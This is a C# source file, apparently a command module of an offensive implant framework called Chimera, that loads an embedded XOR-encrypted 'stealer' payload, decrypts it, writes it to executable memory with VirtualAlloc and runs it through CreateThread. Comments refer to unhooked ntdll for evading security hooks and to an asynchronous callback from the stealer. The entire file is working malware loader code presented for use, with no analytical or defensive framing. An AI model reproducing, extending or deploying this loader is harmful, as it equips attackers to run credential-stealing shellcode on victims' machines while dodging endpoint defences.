using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Chimera.Commands
{
    // run_stealer — executes embedded, XOR‑encrypted shellcode resource.
    // The resource "stealer_enc" must be placed in the project before compile.
    // It decrypts and runs the shellcode in a new thread inside the current process.
    public static class InjectAssembly
    {
        // Resource name of the encrypted stealer payload
        private const string ResourceName = "stealer_enc";
        private static readonly byte XorKey = 0x41; // same key as used to encrypt

        public static string Execute(string parameters)
        {
            // Parameters ignored (can be used to specify resource name in future)
            try
            {
                // Extract encrypted resource
                Assembly asm = Assembly.GetExecutingAssembly();
                using (Stream stream = asm.GetManifestResourceStream(ResourceName))
                {
                    if (stream == null)
                        return $"[error] Resource '{ResourceName}' not found. Embed the encrypted stealer.bin as embedded resource.";

                    byte[] encrypted = new byte[stream.Length];
                    stream.Read(encrypted, 0, encrypted.Length);

                    // XOR decrypt
                    byte[] shellcode = new byte[encrypted.Length];
                    for (int i = 0; i < encrypted.Length; i++)
                        shellcode[i] = (byte)(encrypted[i] ^ XorKey);

                    // Verify shellcode starts with valid PE? Not needed for shellcode.

                    // Allocate RWX memory (now unhooked ntdll, so VirtualAlloc is clean)
                    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
                    if (addr == IntPtr.Zero)
                        return "[error] VirtualAlloc failed.";

                    Marshal.Copy(shellcode, 0, addr, shellcode.Length);

                    // Execute in new thread
                    IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                    if (thread == IntPtr.Zero)
                        return "[error] CreateThread failed.";
                    // Don't wait — thread runs stealer, callback happens asynchronously
                    return $"[+] Stealer shellcode injected. Thread ID: {thread.ToInt32()}";
                }
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}